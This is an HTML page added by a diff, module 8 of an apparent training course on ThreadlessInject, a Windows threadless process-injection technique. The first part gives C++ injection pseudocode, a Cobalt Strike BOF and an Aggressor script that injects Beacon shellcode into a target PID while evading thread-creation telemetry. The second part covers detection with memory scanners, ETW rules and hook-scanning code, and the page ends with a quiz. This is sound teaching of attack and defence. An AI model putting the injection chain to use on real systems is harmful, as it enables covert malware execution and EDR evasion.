@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 8: Full Chain, BOF Integration &amp; Detection - ThreadlessInject Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F9F5;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#14b8a6;--accent2:#0d9488;--gradient:linear-gradient(135deg,#14b8a6,#0d9488)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ThreadlessInject Course</h2>
+<span>Threadless Injection Masterclass</span>
+</div>
+<a class="home-link" href="../ThreadlessInject_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span class="diff d1">1</span> Thread Creation Problem</a>
+<a class="mod-link" href="module2.html"><span class="diff d1">2</span> Remote Function Hooking</a>
+<a class="mod-link" href="module3.html"><span class="diff d1">3</span> Target Function Selection</a>
+<a class="mod-link" href="module4.html"><span class="diff d2">4</span> Remote Memory Allocation</a>
+<a class="mod-link" href="module5.html"><span class="diff d2">5</span> Hook Stub Architecture</a>
+<a class="mod-link" href="module6.html"><span class="diff d2">6</span> Installing Remote Hook</a>
+<a class="mod-link" href="module7.html"><span class="diff d3">7</span> Execution &amp; Cleanup</a>
+<a class="mod-link active" href="module8.html"><span class="diff d3">8</span> Full Chain &amp; Detection</a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 8: Full Chain, BOF Integration &amp; Detection</h1>
+<p class="subtitle">The complete flow from target selection to payload execution, plus how defenders catch it.</p>
+
+<div class="card highlight">
+<h4>Putting It All Together</h4>
+<p>This final module walks through the entire ThreadlessInject chain end-to-end, demonstrates how it integrates with Cobalt Strike as a Beacon Object File (BOF), and then switches perspective to the defender to examine every detection opportunity across the kill chain. Understanding both sides is essential for building effective offensive tools and for conducting realistic detection engineering.</p>
+</div>
+
+<h2>The Complete Injection Chain</h2>
+<p>Here is the full sequence of operations that ThreadlessInject performs, from start to finish. Each step references the module where it was covered in detail:</p>
+
+<div class="diagram">
+<h4>ThreadlessInject: End-to-End Flow</h4>
+<div class="flow" style="flex-direction:column;gap:4px;align-items:stretch;max-width:650px;margin:0 auto">
+<div class="box" style="width:100%"><strong>Step 1</strong>: Open target process handle (PROCESS_VM_OPERATION | VM_WRITE | VM_READ)</div>
+<div class="box" style="width:100%"><strong>Step 2</strong>: Resolve target function address (GetProcAddress for system DLLs)</div>
+<div class="box" style="width:100%"><strong>Step 3</strong>: Read original 14 bytes from target function (NtReadVirtualMemory)</div>
+<div class="box hl" style="width:100%"><strong>Step 4</strong>: Allocate RW memory in target process (NtAllocateVirtualMemory)</div>
+<div class="box hl" style="width:100%"><strong>Step 5</strong>: Build hook stub + shellcode + trampoline locally</div>
+<div class="box hl" style="width:100%"><strong>Step 6</strong>: Write payload to remote allocation (NtWriteVirtualMemory)</div>
+<div class="box y" style="width:100%"><strong>Step 7</strong>: Change remote allocation protection: RW &rarr; RX</div>
+<div class="box y" style="width:100%"><strong>Step 8</strong>: Change target function protection: RX &rarr; RWX</div>
+<div class="box r" style="width:100%"><strong>Step 9</strong>: Overwrite function prologue with 14-byte JMP (NtWriteVirtualMemory)</div>
+<div class="box y" style="width:100%"><strong>Step 10</strong>: Restore target function protection: RWX &rarr; RX</div>
+<div class="box g" style="width:100%"><strong>Step 11</strong>: Wait for trigger &mdash; existing thread calls hooked function</div>
+<div class="box g" style="width:100%"><strong>Step 12</strong>: Shellcode executes, guard is set, original bytes restored</div>
+</div>
+</div>
+
+<pre><code><span class="lang-tag">C++</span>// ThreadlessInject: Complete implementation pseudocode
+bool ThreadlessInject(DWORD pid, const char* dllName, const char* funcName,
+                      BYTE* shellcode, SIZE_T shellcodeLen) {
+
+    // Step 1: Open target process
+    HANDLE hProc = OpenProcess(
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+        FALSE, pid);
+    if (!hProc) return false;
+
+    // Step 2: Resolve target function address
+    HMODULE hDll = GetModuleHandleA(dllName);
+    FARPROC funcAddr = GetProcAddress(hDll, funcName);
+
+    // Step 3: Read original bytes
+    BYTE originalBytes[14];
+    NtReadVirtualMemory(hProc, funcAddr, originalBytes, 14, NULL);
+
+    // Step 4: Calculate total size and allocate remote memory
+    SIZE_T stubSize = CalculateStubSize();
+    SIZE_T totalSize = stubSize + shellcodeLen + 14 + 14 + 4; // stub+sc+orig+jmpback+guard
+    PVOID remoteMem = NULL;
+    NtAllocateVirtualMemory(hProc, &amp;remoteMem, 0, &amp;totalSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    // Step 5: Build complete payload locally
+    BYTE* payload = BuildPayload(remoteMem, funcAddr, shellcode,
+        shellcodeLen, originalBytes);
+
+    // Step 6: Write to remote process
+    NtWriteVirtualMemory(hProc, remoteMem, payload, totalSize, NULL);
+
+    // Step 7: Change payload protection to RX
+    ULONG oldProt;
+    NtProtectVirtualMemory(hProc, &amp;remoteMem, &amp;totalSize,
+        PAGE_EXECUTE_READ, &amp;oldProt);
+
+    // Step 8-10: Install the hook (change prot, write JMP, restore prot)
+    BYTE hookJmp[14];
+    BuildAbsoluteJmp(hookJmp, (UINT64)remoteMem);  // JMP to hook stub
+
+    PVOID funcPage = (PVOID)funcAddr;
+    SIZE_T pageSize = 14;
+    NtProtectVirtualMemory(hProc, &amp;funcPage, &amp;pageSize,
+        PAGE_EXECUTE_READWRITE, &amp;oldProt);
+    NtWriteVirtualMemory(hProc, funcAddr, hookJmp, 14, NULL);
+    NtProtectVirtualMemory(hProc, &amp;funcPage, &amp;pageSize,
+        oldProt, &amp;oldProt);
+
+    // Steps 11-12 happen asynchronously in the target process
+    printf("[+] Hook installed. Waiting for target thread to trigger...\n");
+
+    // Optionally: monitor guard flag and restore original bytes
+    CloseHandle(hProc);
+    free(payload);
+    return true;
+}</code></pre>
+
+<h2>Cobalt Strike BOF Integration</h2>
+<p>A <strong>Beacon Object File (BOF)</strong> is a compiled C object file (.o) that Cobalt Strike can load and execute directly within the Beacon process. BOFs are used for post-exploitation actions because they run in-process (no new process creation) and can use the Beacon's existing communication channel. ThreadlessInject has a BOF implementation that allows operators to perform threadless injection from a Cobalt Strike Beacon.</p>
+
+<h3>BOF Architecture</h3>
+<p>BOFs use a special API provided by Cobalt Strike's Beacon runtime. They cannot use the standard C runtime library (no <code>printf</code>, <code>malloc</code>, etc.). Instead, they use Beacon API functions for output, memory management, and dynamic function resolution:</p>
+
+<pre><code><span class="lang-tag">C</span>// BOF entry point for ThreadlessInject
+// Uses Beacon's Dynamic Function Resolution (DFR) for API calls
+
+#include "beacon.h"
+
+// Declare the Windows APIs we need via DFR
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
+DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
+
+// NTDLL native APIs
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+
+void go(char* args, int alen) {
+    // Parse arguments from Cobalt Strike
+    datap parser;
+    BeaconDataParse(&amp;parser, args, alen);
+    int pid = BeaconDataInt(&amp;parser);
+    char* dllName = BeaconDataExtract(&amp;parser, NULL);
+    char* funcName = BeaconDataExtract(&amp;parser, NULL);
+    int scLen = 0;
+    char* shellcode = BeaconDataExtract(&amp;parser, &amp;scLen);
+
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[*] ThreadlessInject: PID=%d, DLL=%s, Func=%s, SC=%d bytes",
+        pid, dllName, funcName, scLen);
+
+    // Execute the threadless injection chain
+    // (same logic as standalone, using DFR API calls)
+    HANDLE hProc = KERNEL32$OpenProcess(
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+        FALSE, pid);
+
+    if (!hProc) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open process %d", pid);
+        return;
+    }
+
+    // ... (complete injection chain using NTDLL$ prefixed functions)
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Hook installed successfully");
+}</code></pre>
+
+<h3>Aggressor Script Integration</h3>
+<p>The BOF is loaded into Cobalt Strike via an Aggressor script that defines a new command for the operator:</p>
+
+<pre><code><span class="lang-tag">Aggressor</span># ThreadlessInject Aggressor script
+# Registers the 'threadlessinject' command in Cobalt Strike
+
+alias threadlessinject {
+    local('$pid $dll $func $shellcode $bof');
+
+    $pid  = $2;   # Target PID
+    $dll  = $3;   # DLL containing target function
+    $func = $4;   # Export function name to hook
+
+    # Generate shellcode for the target architecture
+    $shellcode = shellcode($1, false, "x64");
+
+    # Read the compiled BOF
+    $bof = readbof("ThreadlessInject.o");
+
+    # Pack arguments and execute the BOF
+    btask($1, "Threadless Inject into PID $pid via $dll!$func");
+    beacon_inline_execute($1, $bof, "go",
+        bof_pack($1, "izzb", $pid, $dll, $func, $shellcode));
+}
+
+# Usage from Cobalt Strike console:
+# threadlessinject 1234 ntdll.dll NtWaitForSingleObject</code></pre>
+
+<div class="card">
+<h4>BOF Advantages</h4>
+<p>Running ThreadlessInject as a BOF has significant operational advantages. The BOF runs inside the existing Beacon process, so there is no new process creation (which would trigger <code>PsSetCreateProcessNotifyRoutine</code> callbacks). The BOF uses Beacon's in-memory execution, so there is no file written to disk. And because the BOF communicates results back through Beacon's existing C2 channel, there is no new network connection to create or monitor.</p>
+</div>
+
+<h2>Detection Vectors</h2>
+<p>Now we switch to the defender's perspective. While ThreadlessInject avoids thread creation telemetry, it is not invisible. Here are the detection opportunities at each stage of the kill chain:</p>
+
+<table>
+<tr><th>Stage</th><th>Detection Method</th><th>Telemetry Source</th><th>Difficulty</th></tr>
+<tr><td>OpenProcess</td><td>Cross-process handle with VM rights</td><td>ObRegisterCallbacks (kernel)</td><td>Medium</td></tr>
+<tr><td>NtAllocateVirtualMemory</td><td>Remote allocation of private memory</td><td>ETW: Microsoft-Windows-Kernel-Memory</td><td>Medium</td></tr>
+<tr><td>NtWriteVirtualMemory</td><td>Cross-process memory write</td><td>ETW: Microsoft-Windows-Kernel-Memory</td><td>Medium</td></tr>
+<tr><td>NtProtectVirtualMemory</td><td>RW&rarr;RX transition on private memory</td><td>ETW: VirtualProtect events</td><td>High (many false positives)</td></tr>
+<tr><td>Prologue overwrite</td><td>Modified DLL code page (COW violation)</td><td>Memory scanning, page hash comparison</td><td>High</td></tr>
+<tr><td>Hook stub in memory</td><td>RX private memory with no backing image</td><td>Memory scanning (Moneta, pe-sieve)</td><td>Medium</td></tr>
+<tr><td>Modified function entry</td><td>Inline hook detection on known exports</td><td>Hook scanning (HookShark, etc.)</td><td>Medium</td></tr>
+</table>
+
+<h2>Memory Scanning Detection</h2>
+<p>Memory scanners like <strong>Moneta</strong> and <strong>pe-sieve</strong> are among the most effective detection tools against ThreadlessInject. They detect two key artifacts:</p>
+
+<h3>1. Unbacked Executable Memory</h3>
+<p>ThreadlessInject allocates private memory (not backed by a DLL file) and marks it as executable. Memory scanners enumerate all memory regions and flag any that are executable but not backed by a known image file on disk. This is the hook stub + shellcode region.</p>
+
+<pre><code><span class="lang-tag">C++</span>// What Moneta detects:
+// Region at 0x00000213A0010000:
+//   Type: MEM_PRIVATE (not backed by a file)
+//   Protection: PAGE_EXECUTE_READ
+//   Size: 4096 bytes
+//   Backing: NONE (no image file)
+//   VERDICT: Suspicious - private executable memory without backing image
+
+// Defender query using Moneta:
+// moneta64.exe -p &lt;target_pid&gt;
+// Output shows all private executable regions that have no backing DLL/EXE</code></pre>
+
+<h3>2. Modified Code Pages (Copy-on-Write)</h3>
+<p>When ThreadlessInject overwrites the target function's prologue, it triggers a <strong>copy-on-write (COW)</strong> fault. DLL code pages are normally shared across all processes (mapped from the same physical memory). When one process writes to a shared page, Windows creates a private copy for that process. Scanners like pe-sieve detect these private copies by comparing the in-memory code with the on-disk DLL file. Any differences indicate code modification (i.e., a hook).</p>
+
+<div class="card warn">
+<h4>pe-sieve Detection</h4>
+<p>Running <code>pe-sieve</code> against the target process after ThreadlessInject is installed will show a <strong>hook detected</strong> alert on the target DLL. The tool compares the in-memory bytes of every loaded DLL against the on-disk file and reports any discrepancies. The 14-byte modification at the target function's entry point is immediately flagged. Even after the hook is cleaned up (original bytes restored), the COW page may still exist (though its contents will match the on-disk file again).</p>
+</div>
+
+<h2>ETW-Based Detection</h2>
+<p>Event Tracing for Windows provides several relevant providers for detecting ThreadlessInject's operations:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Key ETW providers for detection:
+
+// 1. Microsoft-Windows-Kernel-Process
+//    Events: ProcessStart, ThreadStart
+//    ThreadlessInject avoidance: No ThreadStart event (no new thread!)
+//    But: OpenProcess events are still logged
+
+// 2. Microsoft-Windows-Kernel-Memory
+//    Events: VirtualAlloc, VirtualProtect cross-process
+//    Detection: Remote VirtualAlloc + VirtualProtect sequence
+//    Pattern: NtAllocateVirtualMemory(remoteHandle, ..., PAGE_READWRITE)
+//             followed by NtProtectVirtualMemory(..., PAGE_EXECUTE_READ)
+
+// 3. Microsoft-Windows-Threat-Intelligence (TI provider)
+//    Requires PPL (Protected Process Light) to access
+//    Events: NtWriteVirtualMemory, NtProtectVirtualMemory cross-process
+//    This is the most comprehensive source but requires kernel-level access
+
+// Detection rule pseudocode:
+// IF process_A calls NtAllocateVirtualMemory on process_B
+//    AND process_A calls NtWriteVirtualMemory on process_B
+//    AND process_A calls NtProtectVirtualMemory on process_B (RW-&gt;RX)
+//    AND NO NtCreateThreadEx or CreateRemoteThread follows
+// THEN: Possible threadless injection (high confidence)</code></pre>
+
+<h2>Inline Hook Detection</h2>
+<p>Dedicated hook detection tools scan all loaded DLLs for inline hooks by examining the first bytes of exported functions. A <code>JMP</code> instruction at the very beginning of a function (especially to private memory) is a strong indicator of an inline hook:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Simple inline hook detection: check first bytes of exported functions
+bool DetectInlineHook(HMODULE hModule, const char* funcName) {
+    FARPROC funcAddr = GetProcAddress(hModule, funcName);
+    if (!funcAddr) return false;
+
+    BYTE* bytes = (BYTE*)funcAddr;
+
+    // Check for JMP [RIP+0] pattern: FF 25 00 00 00 00
+    if (bytes[0] == 0xFF &amp;&amp; bytes[1] == 0x25 &amp;&amp;
+        *(DWORD*)(bytes + 2) == 0) {
+        UINT64 target = *(UINT64*)(bytes + 6);
+        // Check if jump target is in private (non-image) memory
+        MEMORY_BASIC_INFORMATION mbi;
+        VirtualQuery((PVOID)target, &amp;mbi, sizeof(mbi));
+        if (mbi.Type == MEM_PRIVATE) {
+            printf("[!] HOOK DETECTED: %s -> 0x%llx (private memory)\n",
+                   funcName, target);
+            return true;
+        }
+    }
+
+    // Check for relative JMP: E9 xx xx xx xx
+    if (bytes[0] == 0xE9) {
+        INT32 offset = *(INT32*)(bytes + 1);
+        UINT64 target = (UINT64)funcAddr + 5 + offset;
+        // Similar private memory check...
+    }
+
+    return false;
+}</code></pre>
+
+<h2>Detection Engineering Summary</h2>
+
+<div class="diagram">
+<h4>Detection Coverage Map</h4>
+<div class="flow" style="flex-direction:column;gap:6px;align-items:stretch;max-width:600px;margin:0 auto">
+<div class="box r" style="width:100%"><strong>Strongest Detection</strong>: Memory scanning (pe-sieve, Moneta) for modified code pages and unbacked RX memory</div>
+<div class="box y" style="width:100%"><strong>Good Detection</strong>: ETW TI provider for cross-process NtWriteVirtualMemory + NtProtectVirtualMemory</div>
+<div class="box y" style="width:100%"><strong>Good Detection</strong>: Inline hook scanning on loaded DLL exports</div>
+<div class="box" style="width:100%"><strong>Partial Detection</strong>: ObRegisterCallbacks for suspicious cross-process handle access</div>
+<div class="box g" style="width:100%"><strong>Not Detected</strong>: Thread creation callbacks (no thread created)</div>
+<div class="box g" style="width:100%"><strong>Not Detected</strong>: ETW ThreadStart events (no thread created)</div>
+</div>
+</div>
+
+<div class="card green">
+<h4>Key Takeaway for Defenders</h4>
+<p>ThreadlessInject eliminates the thread creation signal, which was the easiest and most reliable detection for traditional injection. However, it cannot eliminate the need for cross-process memory operations (allocate, write, protect) or the resulting memory artifacts (unbacked executable memory, modified code pages). Detection strategies should focus on (1) memory scanning for private executable regions, (2) ETW monitoring for cross-process VirtualProtect patterns (especially RW&rarr;RX), and (3) periodic inline hook verification on critical system DLL exports.</p>
+</div>
+
+<div class="card">
+<h4>Related Techniques</h4>
+<p>ThreadlessInject is part of a family of advanced injection techniques that avoid thread creation. <strong>PoolParty</strong> by SafeBreach uses Windows thread pool work items for execution. <strong>Mockingjay</strong> by SecurityJoes uses existing RWX sections in vulnerable DLLs to avoid memory allocation entirely. Understanding ThreadlessInject provides the foundation for understanding these related techniques, as they all address the same fundamental problem: triggering code execution without the detectable act of creating a thread.</p>
+</div>
+
+<div class="complete-card">
+<h3>Course Complete</h3>
+<p>You have completed the ThreadlessInject Masterclass. You now understand how threadless injection works at every level: from the detection problems with traditional injection, through the mechanics of remote function hooking, to the byte-level construction of hook stubs and the detection engineering perspective. Apply this knowledge responsibly.</p>
+</div>
+
+<div class="quiz" id="quiz8">
+<h4>Pop Quiz: Full Chain &amp; Detection</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: Which detection method is MOST effective against ThreadlessInject?</p>
+<label data-opt="0"><input type="radio" name="q8_0"> Monitoring CreateRemoteThread calls</label>
+<label data-opt="1"><input type="radio" name="q8_0"> Checking ETW ThreadStart events</label>
+<label data-opt="2"><input type="radio" name="q8_0"> Memory scanning for unbacked executable regions and modified DLL code pages</label>
+<label data-opt="3"><input type="radio" name="q8_0"> Network traffic analysis for C2 beacons</label>
+<div class="explain">ThreadlessInject creates no new threads, so thread-based detection is completely blind. Memory scanning tools (Moneta, pe-sieve) detect both the unbacked executable memory (hook stub + shellcode) and the modified DLL code pages (copy-on-write from overwriting the function prologue). These artifacts exist regardless of whether threads are created.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: What is the primary advantage of running ThreadlessInject as a Cobalt Strike BOF?</p>
+<label data-opt="0"><input type="radio" name="q8_1"> BOFs execute faster than standalone executables</label>
+<label data-opt="1"><input type="radio" name="q8_1"> BOFs run in-process within the existing Beacon, avoiding new process creation and new file writes to disk</label>
+<label data-opt="2"><input type="radio" name="q8_1"> BOFs can bypass all EDR detection</label>
+<label data-opt="3"><input type="radio" name="q8_1"> BOFs have direct kernel access for memory operations</label>
+<div class="explain">BOFs execute within the Beacon process's memory space. There is no new process created (avoiding PsSetCreateProcessNotifyRoutine callbacks), no file written to disk (the object file is loaded in memory), and results are communicated through Beacon's existing C2 channel. This significantly reduces the operational footprint.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q3: What causes a copy-on-write (COW) fault that pe-sieve can detect?</p>
+<label data-opt="0"><input type="radio" name="q8_2"> Writing to a shared DLL code page (overwriting the target function prologue) causes Windows to create a private copy, which differs from the on-disk DLL</label>
+<label data-opt="1"><input type="radio" name="q8_2"> The shellcode allocates too much memory</label>
+<label data-opt="2"><input type="radio" name="q8_2"> The Beacon Object File writes a new DLL to disk</label>
+<label data-opt="3"><input type="radio" name="q8_2"> The target process has DEP enabled</label>
+<div class="explain">DLL code pages are shared physical memory mapped into multiple processes. When ThreadlessInject writes the hook JMP over the function prologue, Windows performs a copy-on-write: it creates a private physical page for this process with the modified bytes. pe-sieve detects this by comparing the in-memory bytes with the original on-disk DLL file &mdash; the 14 modified bytes are immediately visible.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz8')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module7.html">&larr; Previous: Execution &amp; Cleanup</a>
+<a class="primary" href="../ThreadlessInject_index.html">Back to Course Home &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
